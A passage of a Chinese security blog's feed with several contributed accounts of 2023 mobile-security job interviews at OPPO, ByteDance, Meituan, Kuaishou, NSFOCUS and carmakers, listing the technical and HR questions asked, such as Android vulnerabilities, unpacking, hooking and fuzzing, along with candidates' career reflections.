    <content type="html"><![CDATA[<p>大家好！我是同学小E，某985硕，前面看过几个大佬的面试介绍，今天也来分享一下，我自己的面试经历，面试的是OPPO的移动安全实验室，听说oppo有两个移动安全实验室铂安和子午，具体是哪一个我也不清楚，面试结果：顺利拿到offer。</p><span id="more"></span><p>今年行情不好的情况，拿到oppo的offer还是十分开心的，有朋友说OPPO是学历厂，简历筛选比较看重学历，这个从今年的情况来看，可能确实有点，因为身边很多双985的朋友或211+985朋友简历挂了好多，可能今年的名额很少，不过感觉如果你和招聘要求比较符合，应211硕应该简历也能过，总体评估是这样。</p><p>OPPO面试的总体感觉比较好：一轮初试+两轮复试+一轮hr面试，遇到的所有面试官都比较和善，不会的问题也耐心解答，hr小姐姐也十分的温柔，感觉和面试官以及hr都聊的很开心。</p><p><strong>初试：</strong></p><p>初试的对象应该是同事，问的问题也比较温和，首先是自我介绍，这个我就简单介绍了一下个人经历。研究生期间发表过一篇B会，获得20个CVE的漏洞编号，参加了一些ctf的比赛并取得名次。然后就介绍了参与的一些实验室项目经历，就没有了。</p><p>然后和面试官相互交流了下学习心得体会，感觉大家聊的挺开心的，这个过程中顺道问了简历上的第一个项目，讲解了下项目背景，以及里面担任什么样的角色，以及遇到了哪些问题，怎么解决的。</p><p>接着就是问了一些<strong>技术问题</strong>：</p><p>Android框架层常见的漏洞及原理，请列举几个。（这里主要回答了Binder方面的几个经典漏洞）</p><p>如何进行Fuzz去挖掘一些漏洞，Fuzz的原理以及现有的一些通用的Fuzz工具。（这里会问你挖到的漏洞，然后以一个漏洞为例，进行深入的询问，不停的询问漏洞的原理以及如何使用Fuzz挖掘，有没有对一些Fuzz进行改进）</p><p>关于Fuzz这一块问了很多。</p><p>Fuzz技术的原理？</p><p>Fuzz技术的分类？</p><p>当前主流的Fuzz工具？</p><p>Fuzz的切入点？</p><p>例如如何获取Ibinder对象？</p><p>data如何构造？</p><p>然后就问了不了解webview漏洞？</p><p>关于这个我之前还看了看雪2020SDC研究嘉宾OPPO安全实验室何恩的《WebView安全攻防指南》，然后结合自己目前发现的一些，就回答了一下。</p><p>到这里基本一轮面试就完了，接着就是和面试官相互聊天，谈论一些看法。</p><p><strong>复试一轮：</strong></p><p>这一面的面试官主要问APP层面的漏洞，怎么说了APP层面漏洞我也了解一些，不过没做过总结，感觉一部分和web上漏洞其实挺像，这里借用一下星球里群主总结的感觉大概也是这些</p><p><img src="https://tcs.teambition.net/storage/312q3eefb3b9e93186c50e7cbeb25db0e38e?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY3ODg2NjQwOCwiaWF0IjoxNjc4MjYxNjA4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMnEzZWVmYjNiOWU5MzE4NmM1MGU3Y2JlYjI1ZGIwZTM4ZSJ9.FmWBSXElD1c6_QU9V4A3QZP6Dnza7MPZeHBnWUUuKrM&download=image.png"></p><p>主要问了Deeplink漏洞的类型，让我举几个例子。</p><p>Jauns漏洞的原理？</p><p>Pendingintent漏洞原理</p><p>（还有一些漏洞我自己说的，这里说了很久）</p><p>然后问如何进行半自动化漏洞挖掘？（这里我也看了一些当前开源的工具 app层面基本都是规则）</p><p>还有一些半自动化的漏洞工具就是用污点分析？</p><p>这里就问了下污点分析的原理？以及如何进行污点分析去挖漏洞，说一下大致流程？</p><p>基本到这里就结束了，面试快结束，面试官表示印象不错，最后很快就通过了</p><p><strong>复试二轮：</strong></p><p>二轮面试估计是一个领导，面试的侧重点在于对整体把控，问项目很多，问细节很少？</p><p>三个项目轮番问了一遍？最多的问题就是你遇到这样问题怎么解决的？</p><p>然后就是当前研究的一些新的动向了解么？</p><p>你认为当前Android上面哪些漏洞危害较大，值得关注？</p><p>你对未来自己职业发展的一个规划？</p><p>等等吧（其他还有几个问题记不得了）</p><p><strong>hr面：</strong></p><p>hr面没什么区别，就是你是否单身，期望薪资，个人发展规划，城市要求等等</p><p>整体就是这样了，感觉面试过程比较轻松，面试官也挺好，大家春招可以去尝试下。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好！我是同学小E，某985硕，前面看过几个大佬的面试介绍，今天也来分享一下，我自己的面试经历，面试的是OPPO的移动安全实验室，听说oppo有两个移动安全实验室铂安和子午，具体是哪一个我也不清楚，面试结果：顺利拿到offer。&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（6）——2023届字节秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0006/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0006/</id>
    <published>2023-03-08T02:26:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
    <content type="html"><![CDATA[<p>大家好！我是同学小G，今天简单分享一下秋季招聘的面试心得。本来之前在秋招，群主当时问我在星球里面发了一波，今天再投稿一下公众号吧</p><p>面试岗位——字节（无痕实验室）安全研究工程师</p><span id="more"></span><p>面试结果：一面结束</p><p><strong>一面：</strong></p><p>介绍一下你了解的Android APP防护策略？</p><p>加壳脱壳：</p><p>现在加壳的分类？</p><p>如何进行加壳，你写过加壳器么?</p><p>如何进行脱壳，你写过脱壳机么？</p><p>你写的脱壳机和其他对比有什么特色？</p><p>如何防护你写的脱壳机？</p><p>如何防护市面上其他的脱壳机？</p><p>你有逆向字节的VMP加固么？</p><p>你对so层加壳有了解么？</p><p>调试与反调试：</p><p>说下你了解的调试手段？</p><p>如何进行反调试，有哪些方案？</p><p>如何针对反调试进行反反调试，有哪些方案？</p><p>如何对现有的反反调试进行解决，你有什么思路么？</p><p>混淆与反混淆：</p><p>说一下Unicorn的基本原理？</p><p>java层混合和so层混淆的发展，介绍一下？</p><p>java层混淆如何进行反混淆？</p><p>so层OLLVM如何进行反混淆？</p><p>你具体实现过unidbg进行ollvm反混淆么？</p><p>如果不考虑用ollvm混淆，你有什么能避免性能损失来进行防护的手段？</p><p>hook与反hook:</p><p>介绍一下Xposed的基本原理？</p><p>介绍一下frida的基本原理？</p><p>介绍一下检测Xposed的方式？</p><p>介绍一下检测frida的方式？</p><p>如何绕过检测Xposed的方式？</p><p>如何绕过检测frida的方式？</p><p>针对绕过Xposed检测的手段，怎么进行防护？</p><p>针对绕过frida检测的手段，怎么进行防护？</p><p>介绍一下inlinehook的基本原理？</p><p>如何去检测inlinehook?</p><p>列举一下你逆向大厂APP的经验？</p><p>你针对flutter的防护，如何进行绕过抓包？</p><p>列举一些常见的APP漏洞挖掘的手段？</p><p>你知道当前APP的黑产有哪些？</p><p>针对这些黑产有什么解决方案？</p><p><strong>算法题：</strong></p><p>无痕实验室好像到结束都会手撕一道算法题，算法题比较简单，一道有关链表排序的题</p><p><strong>结束语：</strong></p><p>虽然一面面试就失败了，不过积累了很多经验，所以大家可以多去面试，从面试中进行复习，这样的效率更高，不要害怕挂，那么多家公司总有一家是合适的，最后祝大家春招顺利。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好！我是同学小G，今天简单分享一下秋季招聘的面试心得。本来之前在秋招，群主当时问我在星球里面发了一波，今天再投稿一下公众号吧&lt;/p&gt;
&lt;p&gt;面试岗位——字节（无痕实验室）安全研究工程师&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（5）——2023届蔚来_理想_小鹏秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0005/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0005/</id>
    <published>2023-03-08T02:25:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
    <content type="html"><![CDATA[<p>这是本次面试宝典的最后一篇，这里也感谢各位朋友的投稿，包括还有一些朋友的投稿，由于投递的岗位问题差不多，就没有进行发布。移动安全面试基本问题更新差不多了，各个厂商的内容基本包括：Android逆向技术、Android底层漏洞挖掘、Android App漏洞挖掘、Android隐私合规检测、Android病毒样本分析、Android渗透测试等方面的内容。其中根据群友各同学拿的offer汇总消息来看，目前2023届移动安全方向拿到offer的公司：</p><span id="more"></span><p>抖音集团：已offer</p><p>阿里巴巴：已offer</p><p>腾讯：（目前未知）</p><p>美团：已offer</p><p>快手：已offer</p><p>京东：（目前未知）</p><p>华为：已offer</p><p>百度：（目前未知）</p><p>蚂蚁集团：已offer</p><p>网易：（目前未知）</p><p>小米：（目前未知）</p><p>拼多多：（目前未知）</p><p>中兴：目前未知</p><p>荣耀：已offer</p><p>OPPO：已offer</p><p>vivo: 目前未知</p><p>理想：已offer</p><p>蔚来：已offer</p><p>小鹏：已offer</p><p>同程旅行：已offer</p><p>滴滴：目前未知</p><p>度小满：已offer</p><p>微众银行：已offer</p><p>绿盟：目前未知</p><p>360：目前未知</p><p>奇安信：已offer</p><p>美的：已offer</p><p>海康威视：目前未知</p><p>科大讯飞：已offer</p><p>Hello单车：已offer</p><p>深信服：目前未知</p><p>梆梆：目前未知</p><p>爱加密：已offer</p><p>顶象：目前未知</p><p>联想：目前未知</p><p>长亭科技：目前未知</p><p>以上是统计了大家投递的移动安全岗的公司，春招的朋友可以参考。</p><p>今天介绍最后两位同学小H、小I的面试经历，面试公司蔚来、理想、小鹏，这里将三家的面试经历融合整理。</p><p><strong>一面：</strong></p><p>了解Android底层漏洞挖掘的方式么？</p><p>介绍一些常见的Android APP漏洞挖掘方式？</p><p>如何进行自动化的漏洞挖掘？</p><p>了解WebView漏洞挖掘的原理么？</p><p>做过渗透测试的工作么？</p><p>车载互联网上的漏洞有了解么？</p><p>编写过自动化测试框架么？</p><p>如何看待新能源汽车的安全问题？</p><p>有了解过云端、web端的测试工作么？</p><p><strong>二面：</strong></p><p>介绍一下Android APP漏洞挖掘的方法?</p><p>对云、windows渗透测试有了解么？</p><p>说一下未来的职业规划？</p><p>新能源汽车的未来安全需要注意的点？</p><p>你的学习经历与心得？</p><p>你看好新能源汽车的发展么？</p><p>你未来想朝哪个方向发展？</p><p><strong>HR面：</strong></p><p>你期望的城市？</p><p>你遇到过最困难的事？如何解决？</p><p>你期望的薪资？</p><p>你手里有多少offer？</p><p>你认为我们公司吸引你的地方？</p><p>如果我们公司和另外一家开的薪资一样，你会选我们么？</p><p>如果没有达到你的预期薪资，你还会选我们么？</p><p>你有女朋友么？以后两人一起来这个城市发展么？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这是本次面试宝典的最后一篇，这里也感谢各位朋友的投稿，包括还有一些朋友的投稿，由于投递的岗位问题差不多，就没有进行发布。移动安全面试基本问题更新差不多了，各个厂商的内容基本包括：Android逆向技术、Android底层漏洞挖掘、Android App漏洞挖掘、Android隐私合规检测、Android病毒样本分析、Android渗透测试等方面的内容。其中根据群友各同学拿的offer汇总消息来看，目前2023届移动安全方向拿到offer的公司：&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（4）——2023届美团秋季招聘</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0004/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0004/</id>
    <published>2023-03-08T02:24:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
    <content type="html"><![CDATA[<p>大家好，我是小A，应群主邀请，这里给大家分享一下我参加美团秋季校园招聘的心得！也很感谢在群主星球《安全后厨》里面学习到很多知识，对面试很有帮助。</p><p>美团移动安全招聘总共：</p><p>一轮笔试+五轮面试：一轮初试   +   两轮复试   +   一轮加面   +   一轮hr面</p><span id="more"></span><p><strong>第一轮笔试：</strong></p><p>美团的笔试都是统一的笔试题，这里题型包括五道算法题，题目难度：应该好像是两道简单 + 两道中等 + 一道hard题</p><p>不过要求可能不一样，针对开发的朋友要求较高，可能需要大部分的题型都做出了，针对安全的朋友要求可能低一点，不过今年的形式很严峻，大家能做出来，尽量还是多做一点，我当时就只做出3道半，因为自己算法题刷的很少，基本就刷了不到300道题，不过感觉安全的朋友做个大概，应该笔试都能过。</p><p><strong>面试：</strong></p><p>面试的话我建议简历制作还是十分重要的，因为简历的内容可以引导面试官去询问你擅长的方向，所以尽量将自己的简历做的完善一点，而且很多事情也可以作为面试的加分项，例如CVE&#x2F;CNVD漏洞、安全顶会、github开源项目、博客文章、开源工具、CTF比赛等等，有的话尽量写上，在今年秋招的过程中，这些可能能进一步增强你的优势。</p><p><strong>第一轮初试：（1h）</strong></p><p>美团第一轮初试给我的感觉就是问题很广，比较考察你个人的综合知识能力，这不仅仅包括你这个研究方向的知识，还会涉及很多计算机基础、编程语言方面知识，当然面试官会根据你的熟练程度去把握尺度，当时第一轮面试官也挺友善的，所以很多朋友去面试时，遇到不会的问题不要慌张，尽力就好。</p><p><strong>计算机基础：</strong></p><p><strong>操作系统：（操作系统感觉就把第二章准备熟练就可以了）</strong></p><p>进程和线程的区别？</p><p>进程间的通信方式？</p><p><strong>计算机网络：</strong></p><p>NAT的作用及原理？</p><p>Http与Https的区别？</p><p>一般好像安全岗位就操作系统和计算机网络问的要多一点，偶尔有些会加数据结构，其他的就都还好了</p><p><strong>编程语言：</strong></p><p>做移动安全Android的都知道基本要会arm、C&#x2F;C++、java、Android开发这几门语言，但一般安全岗的问题会比开发问的简单一点，所以大家掌握通用的一些问题就可以了</p><p><strong>C&#x2F;C++：</strong></p><p>全局变量，局部变量，const修饰的值保存在elf文件结构的哪里？</p><p>堆和栈的区别？</p><p><strong>java：</strong></p><p>Java与C++面向对象的区别？</p><p><strong>汇编：</strong></p><p>函数参数传递的过程？</p><p>函数返回有几种形式？</p><p><strong>Android开发：</strong></p><p>Android四大组件是什么？</p><p>Activity的生命周期？</p><p>Android进程之间的通信方式？</p><p>我觉的移动安全朋友基本的Android开发四大组件、intent数据传递、数据库、网络编程、等等还是需要掌握。</p><p><strong>安全相关问题：</strong></p><p><strong>逆向：</strong></p><p>Android加壳的种类，以及脱壳的原理？</p><p>so混淆的基本方式？</p><p>Android抓包防护？</p><p>怎么绕过SSLpining？</p><p>怎么针对Socket通信防护？</p><p>权限的分类？</p><p>Bindler通信原理？</p><p><strong>漏洞：</strong></p><p>介绍一下四大组件的漏洞挖掘过程？</p><p>会简单结合简历上的项目来开展询问</p><p><strong>第二轮复试：（55min）</strong></p><p>美团第二轮面试是团队的小组长面试，考察的更多在于综合能力的考察，更多是你对一个完整项目的把握，这个环节更多的去考察简历上的内容。</p><p><strong>技术方向：</strong></p><p>你认为一个APP的渗透测试工作怎么开展？其中会结合你回答的一些问题去穿插的问一下？例如Xposed和frida的工作原理，Xposed和frida的区别等</p><p>你认为如何开展一个APP的漏洞挖掘工作，这个过程中会结合一些经典的漏洞，去询问你原理，例如Janus漏洞呀等</p><p>你认为当前移动安全最新关注的一些方向以及可能遇到的一些困境在哪里？</p><p><strong>论文方向：</strong></p><p>我本人发表了一篇c刊，然后就针对论文问了一下解决的问题，创新点，考虑后续研究什么？</p><p><strong>其他问题：</strong></p><p>介绍了一下美团的移动安全的一些业务？我记得有漏洞的、逆向的、风控的好像这些吧</p><p>以及美团的一些技术沙龙，人才培养呀？</p><p>其他就是个人的一些提问？</p><p><strong>第三轮复试：（50min）</strong></p><p>美团第三轮面试是终端安全负责人进行面试，和第二面一样，不过考察更多在于你在项目中遇到一些问题如何解决，问题偏向整体</p><p><strong>技术方向：</strong></p><p>你如何开展漏洞挖掘工作？</p><p>如果要提高自动化的工具，你觉得漏洞挖掘如何能够更加自动化一点？</p><p>介绍你的两个项目，并说一些你做的工作的突出点？</p><p>你觉得团队合作中最重要的事情是什么？</p><p>你觉得要实现自动化的逆向工具，可能会需要哪些技术和哪些困境，针对这些困境，你觉得是你的话了，如何解决？</p><p>其他的和第二面重合比较大</p><p><strong>其他方向：</strong></p><p>你怎么规划你的职业发展路线的？</p><p>你进行提问环节</p><p><strong>第四轮面试-加面：（1h）</strong></p><p>第四轮面试是电话面，我以为是hr面了，结果是技术面，后来才知道安全基本都是4轮技术面，第四轮面试应该算压力面，全程感受到了被质疑，技术会不停深入，直到你不会？</p><p>说一下arm-vmp与dex-vmp的区别？</p><p>说一下当前dex-vmp的一些解决思路，以及新的vmp的混淆点，有了解么？</p><p>说一些ollvm的分类以及如何解决ollvm的初步思路</p><p>现在ollvm中你认为比较困难的点是哪些？</p><p>针对这些问题，你觉得如何进行解决，有没有什么好的思路？</p><p><strong>论文：</strong></p><p>你认为你论文的优势在哪？反正就是疯狂的质问，压力很大？</p><p>全程感受就是给很大的压力。</p><p><strong>第五轮面试-hr面：（30min）</strong></p><p>第五轮是hr面，到这个阶段基本就是问一些通用问题了</p><p>你遇到的问题，怎么解决？</p><p>你为什么选择我们之类等？</p><p>你项目中认为什么是最重要的？</p><p>最后祝大家春招顺利，也感谢群主对我秋招工作中的帮助！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好，我是小A，应群主邀请，这里给大家分享一下我参加美团秋季校园招聘的心得！也很感谢在群主星球《安全后厨》里面学习到很多知识，对面试很有帮助。&lt;/p&gt;
&lt;p&gt;美团移动安全招聘总共：&lt;/p&gt;
&lt;p&gt;一轮笔试+五轮面试：一轮初试   +   两轮复试   +   一轮加面   +   一轮hr面&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（3）——2023届绿盟秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0003/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0003/</id>
    <published>2023-03-08T02:23:19.000Z</published>
    <updated>2023-12-23T09:13:44.116Z</updated>
    
    <content type="html"><![CDATA[<p>大家好！我是小C，今天在这里分享一下我的面试经历，本人某中部211硕，本科期间学习网络工程，研究生期间跨考到信息安全专业，然后导师这边一个方向是做Android安全的，当时觉得比较感兴趣就选择了，自己属于比较佛系，然后对技术的激情可能也没有那么强烈，同们很多实验室的同学有搞Fuzz，有搞逆向的，自己前两年就到处整一整，感觉也没学到啥，好在幸运的是发了一篇二区sci，提前达到了毕业要求。</p><span id="more"></span><p>可能由于性格原因，找工作也十分的佛系，今年的秋季招聘大家都说地狱级的难度，确实从我们这个小实验室的情况就可以看出来，上一届师兄师姐人均大厂一个offer：阿里、腾讯、字节、百度、美团等，我们这一届好多能进面试阶段都十分艰难。按理说，我们实验室大部分还是双211偏多了吧，学历不算很高，但是以往几年，过一些大厂的简历筛选还是比较容易的，今年确实好多同门，要么就是简历没过，要么就是一面就挂，所以大家的心态都比较爆炸。</p><p>秋招期间听到最多的抱怨话就是大家表示自己研究生三年感觉白读，还不如本科毕业出来工作，对于这些，我也表示理解，因为确实今年全球经济不好，找工作难也是正常。而且因为可能本来就没有对自己抱有过高期望，所以秋招被打击了一遍又一遍，也感觉还好。</p><p>扯到这里，还是不说太多废话了，今天给大家分享绿盟一面的经历，哈哈，连第一轮都没过还是很失落的。</p><p><strong>绿盟一面（1h）：</strong></p><p>安全岗的好处就是很多公司都不用笔试，绿盟就是直接面试，第一面是技术面，我投递的是Android安全研究员，难度其实我觉得还好，感觉大部分问题都回答出来了，也可能是我自己认为的，哈哈。</p><p>绿盟的技术面试两个面试官交叉来问（我当时还在想着是因为确认才两个人来面，还有点小高兴，看来是自己想多了）</p><p><strong>技术面：</strong></p><p>Android漏洞方面：</p><p>介绍一下Android APP存在的漏洞面？（这里网上看了很多的文章，整理了一下，也读了群主的漏洞之战，觉得应该回答还可以吧）</p><p>列举你挖过的两个印象十分深刻的漏洞？（这个介绍了同门其他两个朋友挖的漏洞，漏洞原理比较清楚）</p><p>你了解SDK漏洞挖掘么？（列举了一个案例）</p><p>动态化漏洞挖掘中动态沙箱是怎么实现？（答了一半）</p><p>Android脱壳方面：</p><p>列举当前加壳的种类，脱壳机和其他的区别？（按寒冰大佬的文章回答的，列举了FART和youpk）</p><p>如果现在无法获取源码，你如何进行动态调试？（说了下软件断点调试和硬件断点调试）</p><p>你知道常见的反调试策略以及如何绕过？（说了一下网上通用的案例）</p><p>针对网络流量抓包防护，怎么解决？</p><p>你了解TCP、UDP协议栈么？</p><p>你在校期间做过哪些工具？（这个确实没有）</p><p>你了解哪些开发语言？</p><p><strong>其余问题：</strong></p><p>最多的就是女生为啥想到跨考到做安全？（我说谁没有一个黑客梦呢？嘿嘿）</p><p>以后的职业规划？（说实在，我没有想太多，随便扯了扯）</p><p>再就是一些我提问的问题？（说实在当时觉得对这个工作还是比较期望的，毕竟离家里近一点，而且听说安全研究院不是很忙(当然只是听说，哈哈)）</p><p><strong>最后</strong></p><p>面试完其实感觉自己答得还不错，结果第二天就收到挂了的消息了，还是比较失落的，不过后来想了想，自己对技术也没那么大激情。（硕士快毕业了，梦也醒了）</p><p>现在成功考上了家里的公务员选调，以后还是老老实实躺平吧，哈哈！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好！我是小C，今天在这里分享一下我的面试经历，本人某中部211硕，本科期间学习网络工程，研究生期间跨考到信息安全专业，然后导师这边一个方向是做Android安全的，当时觉得比较感兴趣就选择了，自己属于比较佛系，然后对技术的激情可能也没有那么强烈，同们很多实验室的同学有搞Fuzz，有搞逆向的，自己前两年就到处整一整，感觉也没学到啥，好在幸运的是发了一篇二区sci，提前达到了毕业要求。&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（2）——2023届快手秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0002/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0002/</id>
    <published>2023-03-08T02:22:19.000Z</published>
    <updated>2023-12-23T09:13:44.116Z</updated>
    
    <content type="html"><![CDATA[<p>大家好，我是同学小F，某211硕士研究生，今天给大家介绍一下秋季的面试经历，今年秋招形势很难，投了好几家公司简历都没过，本科的时候也尝试找了下工作，当时基本大厂和国企基本拿了一些，后来保研就留在本校了，想着环境熟悉并且在原来的导师手下干活就没有去其他学校，今年在起初听到很多朋友说就业形势不好，其实也没想太多，然而真正等自己去找工作，才有点受打击。硕士期间主要在研究Android安全方向，漏洞、加壳与一些常见的逆向技术都有所涉及，硕士在校期间只发了一篇SCI 2区论文，一篇c会，然后就是实验室的各种项目经历了。</p><span id="more"></span><p>秋招提前批开始时，尝试了一些大厂，例如字节无恒，倒是给面试机会，不过一面完后就被挂了，而例如车厂，蔚来简历没过，后来到正式批了，又尝试了一些手机厂，想着大部分手机厂应该招移动安全人员，小米、荣耀、vivo都没有过简历，虽然小米给笔试（不过我朋友双9的就直接面试了），这属实是将信心有点打击。后来又试了一些企业，也拿了大厂、中厂、国企的offer，不过经历了新冠后，觉得可能生活更加重要吧，现在考到家这边的国家电网，准备躺平了。</p><p>最后结合自己的经历，给下半年秋招找工作的朋友一点建议，大家可以去实习，还是得去实习，实习经历很重要，再者安全很看成果，大家可以拿一些漏洞证书或CVE编号，以及打打ctf比赛，多在开源社区写写博客，制作开源工具等等，进一步提高自己知名度，硕士期间可能话还是可以发发高质量论文，这样之后的选择有很多，本来导师给我说继续本校硕博连读，不过想着自己读了太多年书了，所以就拒绝了，不过如果硕士期间有几篇不错论文，还是可以申请到很多高校读博的。</p><p>说了有点多，今天给大家分享一下快手的面试经历：（一轮初始+两轮复试+一轮hr面）</p><p><strong>一面：</strong></p><p>快手一面的面试官很和蔼，感觉交谈很融洽：</p><p><strong>基础知识：</strong></p><p>进程与线程区别？</p><p>计算机网络协议http与https的区别？</p><p>Android上中间人抓包的原理？如何进行防护？如何进行对抗？还有哪些抓包方式？非root环境可以抓包嘛？说说方案？现有的一些最难的抓包情况是怎么样的？flutter有了解么？遇到这种情况怎么进行抓包？除了你提到的这些通用抓包方案？还有没有其他思路？</p><p>Android动态加载壳、不落地加载壳、函数抽取壳的加壳原理以及脱壳方案？</p><p>了解Hook么，说下当前常用的一些hook方式？Xposed与Frida的原理，Frida与ptrace的关系，Frida和IDA能同时使用么？Frida绕过的常见方式？</p><p>IDA中F5防护的一些手段？</p><p>了解签名校验么？Android的签名机制？一些常用的签名校验方式？如何进行绕过？</p><p>了解重打包么？如何检测重打包？</p><p>Android中的漏洞挖掘了解么，列举你知道的经典漏洞原理？</p><p>问题大概就这些，然后最后面试官说道来我们手撕一道算法题，好像是一道简单题，有关排序问题的？给15问题在他们系统上写完？</p><p><strong>二面：</strong></p><p>二面问的感觉还挺深入的，好多问题没回答好？</p><p>vmp虚拟化如何实现对字段的虚拟化？</p><p>中断的具体汇编指令是哪个？   </p><p>中断hook的一些实现的函数方法？ </p><p>控制流平坦化的解决？ </p><p>符号执行解决虚假控制流？</p><p>frida的inlinehook具体修改哪几条指令？  </p><p>Magisk怎么实现root？    </p><p>Magisk和EdXposed的关系？</p><p>Xposed为什么不能在Android8.0上使用？</p><p>Android版本更新，机制的重大变化？</p><p>Magisk怎么进行隐藏指纹信息？  </p><p>不落地加载的基本原理？</p><p>got表hook和plt表hook的区别？</p><p>got表中有几种重定向的方式？</p><p>为了么可以删除section节区？</p><p>initarry的作用，可以没有initarry么？</p><p>针so里面的不同点字符加密怎么解决？</p><p>got表hook和inlinehook的优缺？</p><p>Dex2c的分析手段？</p><p>为什么Dex2C会影响性能？</p><p>ollvm中的不透明谓词有了解么？ 针对不透明谓词是怎么解决的？</p><p>Unicorn里面一些问题？</p><p><strong>三面：</strong></p><p>三面的面试官应该是一个组长，问的项目经历，然后就是两篇论文问了很多？</p><p>创新点、数据集、以后怎么做？</p><p>还有就是Android恶意应用对抗，现有的恶意应用中有很多对抗手段，是怎么进行考虑的，你来防护怎么做？</p><p>以后的职业规划？</p><p><strong>四面：</strong></p><p>hr问了下移动安全的发展？</p><p>Android的设备指纹防护？</p><p>再就是就业地点，一些其他问题了？</p><p>最后整体就是这样，希望大家找工作顺利，以后就膜拜各位安全大佬了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好，我是同学小F，某211硕士研究生，今天给大家介绍一下秋季的面试经历，今年秋招形势很难，投了好几家公司简历都没过，本科的时候也尝试找了下工作，当时基本大厂和国企基本拿了一些，后来保研就留在本校了，想着环境熟悉并且在原来的导师手下干活就没有去其他学校，今年在起初听到很多朋友说就业形势不好，其实也没想太多，然而真正等自己去找工作，才有点受打击。硕士期间主要在研究Android安全方向，漏洞、加壳与一些常见的逆向技术都有所涉及，硕士在校期间只发了一篇SCI 2区论文，一篇c会，然后就是实验室的各种项目经历了。&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（1）——2023届科大讯飞秋季招聘</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0001/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0001/</id>
    <published>2023-03-08T02:21:19.000Z</published>
    <updated>2023-12-23T09:13:44.116Z</updated>
    
